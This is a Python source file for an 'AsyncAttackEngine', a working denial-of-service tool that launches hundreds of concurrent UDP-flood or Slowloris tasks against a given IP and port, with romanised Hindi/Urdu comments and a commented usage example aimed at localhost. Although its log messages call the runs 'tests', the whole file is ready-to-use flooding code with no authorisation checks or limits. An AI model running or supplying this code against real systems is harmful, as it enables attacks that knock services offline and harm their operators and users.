import asyncio
import random
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("AsyncAttackEngine")

class AsyncAttackEngine:
    def __init__(self, target_ip, target_port, timeout=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.total_requests = 0
        self.is_running = False

    async def udp_flood_task(self):
        """UDP Flood using non-blocking transport"""
        # UDP connectionless hai, isliye transport loop ke bahar create hota hai
        loop = asyncio.get_running_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: asyncio.DatagramProtocol(),
            remote_addr=(self.target_ip, self.target_port)
        )
        
        payload = random._urandom(1024)
        try:
            while self.is_running:
                transport.sendto(payload)
                self.total_requests += 1
                # Chota sa gap taaki loop ko saas lene ka mauqa mile
                await asyncio.sleep(0) 
        finally:
            transport.close()

    async def slowloris_task(self):
        """Slowloris using async streams"""
        try:
            reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
            writer.write(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode())
            writer.write("User-Agent: AsyncTester/1.0\r\n".encode())
            
            while self.is_running:
                await asyncio.sleep(15)
                writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                await writer.drain()
                self.total_requests += 1
        except Exception:
            pass # Connection tootne par task khatam

    async def run(self, method="udp", intensity=1000):
        self.is_running = True
        start_time = time.time()
        tasks = []

        logger.info(f"Starting {method} test on {self.target_ip} with {intensity} tasks...")

        if method == "udp":
            tasks = [self.udp_flood_task() for _ in range(intensity)]
        elif method == "slowloris":
            tasks = [self.slowloris_task() for _ in range(intensity)]

        # Run all tasks simultaneously
        try:
            await asyncio.wait_for(asyncio.gather(*tasks), timeout=self.timeout)
        except asyncio.TimeoutError:
            logger.info("Test timeout reached.")
        finally:
            self.is_running = False
            duration = time.time() - start_time
            rps = self.total_requests / duration if duration > 0 else 0
            logger.info(f"Test Stopped. Total Requests: {self.total_requests}, RPS: {round(rps, 2)}")

# Istemal karne ka tareeqa:
# engine = AsyncAttackEngine("127.0.0.1", 80, timeout=10)
# asyncio.run(engine.run(method="udp", intensity=500))
